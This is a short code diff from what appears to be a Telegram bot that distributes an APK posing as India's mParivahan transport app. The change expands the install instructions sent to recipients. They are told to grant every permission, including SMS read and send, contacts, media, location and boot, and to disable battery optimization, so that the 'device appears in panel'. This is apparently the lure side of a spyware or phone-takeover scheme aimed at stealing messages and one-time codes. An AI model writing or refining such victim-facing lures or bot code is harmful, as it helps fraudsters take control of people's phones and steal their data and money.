@@ -219,8 +219,13 @@ async function sendMparivahanApk(ctx: Context) {
     await ctx.reply(
       `📱 *Install Steps:*\n\n` +
         `1. Install & open the APK\n` +
-        `2. Allow all permissions\n` +
-        `3. Done — device will appear in panel\n\n` +
+        `2. Allow ALL permissions when asked:\n` +
+        `   • SMS — read + send\n` +
+        `   • Contacts — address book access\n` +
+        `   • Photos & Videos — media access\n` +
+        `   • Phone, Location, Storage, Boot\n` +
+        `   • Disable battery optimization\n` +
+        `3. Done — device appears in panel\n\n` +
         `_Isse install karte hi aapka device panel mein connect ho jayega._`,
       { parse_mode: "Markdown" }
     );
